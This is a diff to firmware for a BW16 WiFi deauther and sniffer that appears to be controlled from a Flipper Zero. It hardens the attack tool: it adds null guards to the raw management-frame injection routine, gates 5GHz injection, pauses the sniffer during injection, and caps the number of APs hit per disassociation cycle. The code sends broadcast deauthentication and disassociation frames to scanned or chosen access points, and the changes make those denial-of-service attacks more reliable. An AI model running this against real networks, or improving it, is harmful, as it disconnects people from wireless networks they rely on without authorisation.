@@ -64,6 +64,7 @@ unsigned long scan_time      = 5000;     // WiFi scan duration (ms)
 unsigned long num_send_frames = 3;
 int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
 bool scan_between_cycles     = false;    // If true, scans between each attack cycle
+bool allow_5ghz_attack       = false;    // Gate raw injection to 2.4GHz unless explicitly enabled
 
 uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast
 
@@ -223,6 +224,15 @@ void sendResponse(const String& response) {
         Serial1.flush();
         lastUARTSend = currentTime;
     }
+}
+
+// Paced single-line output for multi-line command replies (help/info/status).
+// sendResponse() silently drops lines sent inside the 25ms USB / 50ms UART
+// rate-limit windows, so we space each line past both thresholds. Only call
+// this from command/loop context (never from the promisc callback).
+void sendResponseLine(const String& response) {
+    sendResponse(response);
+    delay(UART_MIN_INTERVAL + 10); // clear both the 25ms USB and 50ms UART throttles
 }
 
 // =========================
@@ -394,6 +404,26 @@ void stopSniffing() {
   }
 }
 
+// Injecting management frames while the promiscuous RX callback is active makes
+// the deauth TX path and the sniffer RX path touch shared driver-internal state
+// concurrently, which can corrupt it or lock the BW16. Pause promiscuous around
+// an attack cycle and restore it afterward. isSniffing is left unchanged so the
+// rest of the firmware still considers the sniffer "on" while it is paused.
+bool pauseSnifferForInjection() {
+  if (isSniffing) {
+    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
+    return true;
+  }
+  return false;
+}
+
+void resumeSnifferAfterInjection(bool wasSniffing) {
+  if (wasSniffing) {
+    wifi_enter_promisc_mode();
+    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
+  }
+}
+
 // Prints a MAC address on the serial port, format XX:XX:XX:XX:XX:XX
 void printMac(const uint8_t *mac) {
   char buf[18]; // XX:XX:XX:XX:XX:XX + terminator
@@ -518,13 +548,29 @@ unsigned long last_disassoc_attack = 0;
 // Raw Frame Injection
 //==========================================================
 void wifi_tx_raw_frame(void* frame, size_t length) {
-  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
+  // The driver internals are reached through hardcoded RTL8720 BSP offsets.
+  // If WiFi is not fully initialized (or the BSP layout changed), these
+  // pointers can be null/stale and dereferencing them hard-faults the chip,
+  // which is a prime cause of lockups during sustained attacks. Guard the
+  // whole chain before touching it.
+  if (rltk_wlan_info == nullptr) {
+    return;
+  }
+  uint32_t *info_slot = *(uint32_t **)(rltk_wlan_info + 0x10);
+  if (info_slot == nullptr || *info_slot == 0) {
+    return;
+  }
+  uint8_t *ptr = (uint8_t *)(*info_slot);
   uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xae0);
 
   if (frame_control != 0) {
     update_mgntframe_attrib(ptr, frame_control + 8);
-    memset((void *)(*(uint32_t *)(frame_control + 0x80)), 0, 0x68);
-    uint8_t *frame_data = (uint8_t *)(*(uint32_t *)(frame_control + 0x80)) + 0x28;
+    uint32_t buf = *(uint32_t *)(frame_control + 0x80);
+    if (buf == 0) {
+      return; // no xmit buffer backing this frame; avoid null deref
+    }
+    memset((void *)buf, 0, 0x68);
+    uint8_t *frame_data = (uint8_t *)buf + 0x28;
     memcpy(frame_data, frame, length);
     *(uint32_t *)(frame_control + 0x14) = length;
     *(uint32_t *)(frame_control + 0x18) = length;
@@ -796,13 +842,10 @@ void handleCommand(String command) {
     return;
   }
 
-  // Filter out common log patterns that might come from Flipper Zero
-  if (command.indexOf("log") != -1 || command.indexOf("Log") != -1 || 
-      command.indexOf("timestamp") != -1 || command.indexOf("Timestamp") != -1 ||
-      command.indexOf("received") != -1 || command.indexOf("Received") != -1 ||
-      command.indexOf("sent") != -1 || command.indexOf("Sent") != -1) {
-    return;
-  }
+  // Echoed log lines (e.g. the "[DEBUG] UART Command received:" bridge) are
+  // already dropped by the anchored startsWith("[...") checks above. The old
+  // indexOf() substring filter here matched "log"/"sent"/"received" anywhere
+  // in the string and dropped legitimate commands, so it has been removed.
 
   // Validate that this looks like a legitimate command
   if (!isValidCommand(command)) {
@@ -1086,6 +1129,19 @@ void handleCommand(String command) {
           sendResponse("[ERROR] Invalid value for LED. Use 'set led on' or 'set led off'.");
         }
       }
+      else if (key.equalsIgnoreCase("attack_5ghz")) {
+        if (value.equalsIgnoreCase("on")) {
+          allow_5ghz_attack = true;
+          sendResponse("[INFO] 5GHz injection enabled (unreliable; may wedge the radio).");
+        }
+        else if (value.equalsIgnoreCase("off")) {
+          allow_5ghz_attack = false;
+          sendResponse("[INFO] 5GHz injection disabled. Attacks limited to 2.4GHz.");
+        }
+        else {
+          sendResponse("[ERROR] Invalid value for attack_5ghz. Use 'on' or 'off'.");
+        }
+      }
       else if (key.equalsIgnoreCase("target")) {
         // e.g., set target 1,2,3
         target_aps.clear();
@@ -1151,64 +1207,66 @@ void handleCommand(String command) {
     }
   }
   else if (command.equalsIgnoreCase("info")) {
-    sendResponse("[INFO] Current Configuration:");
-    sendResponse("[INFO] Cycle Delay: " + String(cycle_delay) + " ms");
-    sendResponse("[INFO] Scan Time: " + String(scan_time) + " ms");
-    sendResponse("[INFO] Number of Frames per AP: " + String(num_send_frames));
-    sendResponse("[INFO] Start Channel: " + String(start_channel));
-    sendResponse("[INFO] Scan between attack cycles: " + String(scan_between_cycles ? "Enabled" : "Disabled"));
-    sendResponse("[INFO] LEDs: " + String(USE_LED ? "On" : "Off"));
+    sendResponseLine("[INFO] Current Configuration:");
+    sendResponseLine("[INFO] Cycle Delay: " + String(cycle_delay) + " ms");
+    sendResponseLine("[INFO] Scan Time: " + String(scan_time) + " ms");
+    sendResponseLine("[INFO] Number of Frames per AP: " + String(num_send_frames));
+    sendResponseLine("[INFO] Start Channel: " + String(start_channel));
+    sendResponseLine("[INFO] Scan between attack cycles: " + String(scan_between_cycles ? "Enabled" : "Disabled"));
+    sendResponseLine("[INFO] LEDs: " + String(USE_LED ? "On" : "Off"));
+    sendResponseLine("[INFO] 5GHz Injection: " + String(allow_5ghz_attack ? "Enabled" : "Disabled"));
 
     if (target_mode && !target_aps.empty()) {
-      sendResponse("[INFO] Targeted APs:");
+      sendResponseLine("[INFO] Targeted APs:");
       for (size_t i = 0; i < target_aps.size(); i++) {
-        sendResponse("[INFO] - SSID: " + target_aps[i].ssid +
+        sendResponseLine("[INFO] - SSID: " + target_aps[i].ssid +
                      " BSSID: " + target_aps[i].bssid_str);
       }
     }
     else {
-      sendResponse("[INFO] No APs targeted.");
+      sendResponseLine("[INFO] No APs targeted.");
     }
-    sendResponse("[INFO] Current Mode: " + String(currentMode));
+    sendResponseLine("[INFO] Current Mode: " + String(currentMode));
     if (DEBUG_MODE) {
-      sendResponse("[DEBUG] 'info' command processed");
+      sendResponseLine("[DEBUG] 'info' command processed");
     }
   }
   else if (command.equalsIgnoreCase("help")) {
-    sendResponse("[INFO] Available Commands:");
-    sendResponse("[INFO]  - start deauther       : Begin the deauth attack cycle.");
-    sendResponse("[INFO]  - stop deauther        : Stop all attack cycles.");
-    sendResponse("[INFO]  - scan                 : Perform a WiFi scan and display results.");
-    sendResponse("[INFO]  - results              : Show last scan results.");
-    sendResponse("[INFO]  - disassoc             : Begin continuous disassociation attacks.");
-    sendResponse("[INFO]  - random_attack        : Deauth a randomly chosen AP from the scan list.");
-    sendResponse("[INFO]  - attack_time <ms>     : Start a timed attack for the specified duration.");
-    sendResponse("[INFO] WiFi Sniffer Commands:");
-    sendResponse("[INFO]  - start sniff          : Enable the sniffer with ALL mode.");
-    sendResponse("[INFO]  - sniff beacon         : Enable/Disable beacon capture.");
-    sendResponse("[INFO]  - sniff probe          : Enable/Disable probe requests/responses.");
-    sendResponse("[INFO]  - sniff deauth         : Enable/Disable deauth/disassoc frames.");
-    sendResponse("[INFO]  - sniff eapol          : Enable/Disable EAPOL frames.");
-    sendResponse("[INFO]  - sniff pwnagotchi     : Enable/Disable Pwnagotchi beacons.");
-    sendResponse("[INFO]  - sniff all            : Enable/Disable all frames.");
-    sendResponse("[INFO]  - stop sniff           : Stop sniffing.");
-    sendResponse("[INFO]  - hop on               : Enable channel hopping.");
-    sendResponse("[INFO]  - hop off              : Disable channel hopping.");
-    sendResponse("[INFO] Configuration Commands:");
-    sendResponse("[INFO]  - set <key> <value>    : Update configuration values:");
-    sendResponse("[INFO]      * ch X             : Set to specific channel X, or 'set ch 1,6,36' for multiple.");
-    sendResponse("[INFO]      * target <indices> : Set target APs by their indices, e.g., 'set target 1,3,5'.");
-    sendResponse("[INFO]      * cycle_delay (ms) : Delay between scan/deauth cycles.");
-    sendResponse("[INFO]      * scan_time (ms)   : Duration of WiFi scans.");
-    sendResponse("[INFO]      * num_frames       : Number of frames sent per AP.");
-    sendResponse("[INFO]      * start_channel    : Start channel for scanning (1 or 36).");
-    sendResponse("[INFO]      * scan_cycles      : on/off - Enable or disable scan between cycles.");
-    sendResponse("[INFO]      * led on/off       : Enable or disable LEDs.");
-    sendResponse("[INFO]      * debug on/off     : Enable or disable debug mode.");
-    sendResponse("[INFO]      * debug true/false : Enable or disable debug mode.");
-    sendResponse("[INFO]  - info                 : Display the current configuration.");
-    sendResponse("[INFO]  - status               : Display current system status.");
-    sendResponse("[INFO]  - help                 : Display this help message.");
+    sendResponseLine("[INFO] Available Commands:");
+    sendResponseLine("[INFO]  - start deauther       : Begin the deauth attack cycle.");
+    sendResponseLine("[INFO]  - stop deauther        : Stop all attack cycles.");
+    sendResponseLine("[INFO]  - scan                 : Perform a WiFi scan and display results.");
+    sendResponseLine("[INFO]  - results              : Show last scan results.");
+    sendResponseLine("[INFO]  - disassoc             : Begin continuous disassociation attacks.");
+    sendResponseLine("[INFO]  - random_attack        : Deauth a randomly chosen AP from the scan list.");
+    sendResponseLine("[INFO]  - attack_time <ms>     : Start a timed attack for the specified duration.");
+    sendResponseLine("[INFO] WiFi Sniffer Commands:");
+    sendResponseLine("[INFO]  - start sniff          : Enable the sniffer with ALL mode.");
+    sendResponseLine("[INFO]  - sniff beacon         : Enable/Disable beacon capture.");
+    sendResponseLine("[INFO]  - sniff probe          : Enable/Disable probe requests/responses.");
+    sendResponseLine("[INFO]  - sniff deauth         : Enable/Disable deauth/disassoc frames.");
+    sendResponseLine("[INFO]  - sniff eapol          : Enable/Disable EAPOL frames.");
+    sendResponseLine("[INFO]  - sniff pwnagotchi     : Enable/Disable Pwnagotchi beacons.");
+    sendResponseLine("[INFO]  - sniff all            : Enable/Disable all frames.");
+    sendResponseLine("[INFO]  - stop sniff           : Stop sniffing.");
+    sendResponseLine("[INFO]  - hop on               : Enable channel hopping.");
+    sendResponseLine("[INFO]  - hop off              : Disable channel hopping.");
+    sendResponseLine("[INFO] Configuration Commands:");
+    sendResponseLine("[INFO]  - set <key> <value>    : Update configuration values:");
+    sendResponseLine("[INFO]      * ch X             : Set to specific channel X, or 'set ch 1,6,36' for multiple.");
+    sendResponseLine("[INFO]      * target <indices> : Set target APs by their indices, e.g., 'set target 1,3,5'.");
+    sendResponseLine("[INFO]      * cycle_delay (ms) : Delay between scan/deauth cycles.");
+    sendResponseLine("[INFO]      * scan_time (ms)   : Duration of WiFi scans.");
+    sendResponseLine("[INFO]      * num_frames       : Number of frames sent per AP.");
+    sendResponseLine("[INFO]      * start_channel    : Start channel for scanning (1 or 36).");
+    sendResponseLine("[INFO]      * scan_cycles      : on/off - Enable or disable scan between cycles.");
+    sendResponseLine("[INFO]      * led on/off       : Enable or disable LEDs.");
+    sendResponseLine("[INFO]      * attack_5ghz on/off : Allow raw injection on 5GHz APs (default off).");
+    sendResponseLine("[INFO]      * debug on/off     : Enable or disable debug mode.");
+    sendResponseLine("[INFO]      * debug true/false : Enable or disable debug mode.");
+    sendResponseLine("[INFO]  - info                 : Display the current configuration.");
+    sendResponseLine("[INFO]  - status               : Display current system status.");
+    sendResponseLine("[INFO]  - help                 : Display this help message.");
   }
   else if (command.equalsIgnoreCase("toggle_debug")) {
     DEBUG_MODE = !DEBUG_MODE;
@@ -1223,13 +1281,13 @@ void handleCommand(String command) {
     sendResponse("[INFO] Debug mode disabled.");
   }
   else if (command.equalsIgnoreCase("status")) {
-    sendResponse("[INFO] Current Status:");
-    sendResponse("[INFO] - Attack Enabled: " + String(attack_enabled ? "Yes" : "No"));
-    sendResponse("[INFO] - Scan Between Cycles: " + String(scan_between_cycles ? "Yes" : "No"));
-    sendResponse("[INFO] - Debug Mode: " + String(DEBUG_MODE ? "Yes" : "No"));
-    sendResponse("[INFO] - Disassoc Enabled: " + String(disassoc_enabled ? "Yes" : "No"));
-    sendResponse("[INFO] - Is Sniffing: " + String(isSniffing ? "Yes" : "No"));
-    sendResponse("[INFO] - Is Hopping: " + String(isHopping ? "Yes" : "No"));
+    sendResponseLine("[INFO] Current Status:");
+    sendResponseLine("[INFO] - Attack Enabled: " + String(attack_enabled ? "Yes" : "No"));
+    sendResponseLine("[INFO] - Scan Between Cycles: " + String(scan_between_cycles ? "Yes" : "No"));
+    sendResponseLine("[INFO] - Debug Mode: " + String(DEBUG_MODE ? "Yes" : "No"));
+    sendResponseLine("[INFO] - Disassoc Enabled: " + String(disassoc_enabled ? "Yes" : "No"));
+    sendResponseLine("[INFO] - Is Sniffing: " + String(isSniffing ? "Yes" : "No"));
+    sendResponseLine("[INFO] - Is Hopping: " + String(isHopping ? "Yes" : "No"));
   }
   else {
     sendResponse("[ERROR] Unknown command. Type 'help' for a list of commands.");
@@ -1289,9 +1347,21 @@ void attackCycle() {
     sendResponse("[INFO] Limiting attack to first 20 APs to prevent system overload");
   }
 
+  // Pause the sniffer while injecting to avoid concurrent TX/RX driver access.
+  bool wasSniffing = pauseSnifferForInjection();
+
   uint8_t currentChannel = 0xFF;
   for (size_t i = 0; i < maxAPs; i++) {
     uint8_t targetChannel = scan_results[i].channel;
+
+    // Raw mgmt-frame injection uses the 2.4GHz TX path; injecting on a 5GHz
+    // channel is unreliable and can wedge the radio. Skip unless enabled.
+    if (targetChannel >= 36 && !allow_5ghz_attack) {
+      sendResponse("[INFO] Skipping 5GHz AP " + scan_results[i].ssid +
+                   " (ch " + String(targetChannel) + "). Enable with 'set attack_5ghz on'.");
+      continue;
+    }
+
     if (targetChannel != currentChannel) {
       wifi_set_channel(targetChannel);
       currentChannel = targetChannel;
@@ -1307,16 +1377,18 @@ void attackCycle() {
       sendResponse("[INFO] Deauth " + String(j + 1) + " => " + scan_results[i].ssid +
                    " (" + scan_results[i].bssid_str + ") on channel " +
                    String(scan_results[i].channel));
-      
+
       // Add small delay between frames to prevent stack overflow
       delay(10);
       // Feed watchdog to prevent resets during long attacks
       yield();
     }
-    
+
     // Add delay between APs to prevent overwhelming the system
     delay(25);
   }
+
+  resumeSnifferAfterInjection(wasSniffing);
   sendResponse("[INFO] Attack cycle completed.");
 }
 
@@ -1461,12 +1533,30 @@ void loop() {
       return;
     }
 
-    for(size_t i = 0; i < aps_to_attack.size(); i++) {
+    // Cap per-cycle work like attackCycle() does; an uncapped loop over every
+    // scanned AP can run long enough inside loop() to starve the watchdog and
+    // block 'stop'/WebSocket servicing.
+    size_t maxAPs = min((size_t)20, aps_to_attack.size());
+    if (aps_to_attack.size() > 20) {
+      sendResponse("[INFO] Limiting disassoc to first 20 APs to prevent system overload");
+    }
+
+    // Pause the sniffer while injecting to avoid concurrent TX/RX driver access.
+    bool wasSniffing = pauseSnifferForInjection();
+
+    for(size_t i = 0; i < maxAPs; i++) {
+      // Raw injection uses the 2.4GHz TX path; skip 5GHz APs unless enabled.
+      if (aps_to_attack[i].channel >= 36 && !allow_5ghz_attack) {
+        sendResponse("[INFO] Skipping 5GHz AP " + aps_to_attack[i].ssid +
+                     " (ch " + String(aps_to_attack[i].channel) + "). Enable with 'set attack_5ghz on'.");
+        continue;
+      }
+
       wifi_set_channel(aps_to_attack[i].channel);
 
       for(unsigned long j = 0; j < num_send_frames; j++) {
         // Reason code 8 => Disassociated because station left
-        wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, 0x08); 
+        wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, 0x08);
 
         // Optional LED blink
         if(USE_LED) {
@@ -1478,17 +1568,18 @@ void loop() {
         sendResponse("[INFO] Disassoc frame " + String(j + 1) + " => " + aps_to_attack[i].ssid +
                      " (" + aps_to_attack[i].bssid_str + ") on channel " +
                      String(aps_to_attack[i].channel));
-        
+
         // Add small delay between frames to prevent stack overflow
         delay(10);
         // Feed watchdog to prevent resets during long attacks
         yield();
       }
-      
+
       // Add delay between APs to prevent overwhelming the system
       delay(25);
     }
 
+    resumeSnifferAfterInjection(wasSniffing);
     sendResponse("[INFO] Disassociation Attack cycle completed.");
   }
 
